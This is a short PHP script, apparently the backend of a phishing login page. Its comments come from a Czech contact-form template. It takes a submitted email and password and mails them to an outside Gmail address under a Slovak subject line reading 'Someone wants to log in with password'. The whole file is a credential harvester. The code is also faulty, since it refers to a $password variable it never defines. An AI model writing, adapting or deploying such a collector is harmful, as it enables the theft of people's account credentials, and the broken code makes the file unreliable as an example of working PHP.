<?php

    // Načítá pole z formuláře - name, email a message; odstraňuje bílé znaky; odstraňuje HTML
    $name = strip_tags(trim($_POST["password"]));
    $name = str_replace(array("\r","\n"),array(" "," "),$name);
    $email = filter_var(trim($_POST["email"]), FILTER_SANITIZE_EMAIL);
    $message = trim($_POST["message"]);

    // Nastavte si email, nakterý chcete, aby se vyplněný formulář odeslal - jakýkoli váš email
    $recipient = "noreply.star.2@gmail.com";

    // Nastavte předmět odeslaného emailu
    $subject = "Niekto sa chce prihlásiť s heslom: $password ";

    // Obsah emailu, který se vám odešle
    $email_content = "Email: $email\n";
    $email_content .= "Heslo: $password\n\n";

    // Emailová hlavička
    $email_headers = "From:  <$email>";

    // Odeslání emailu - dáme vše dohromady
    mail($recipient, $subject, $email_content, $email_headers);

?>
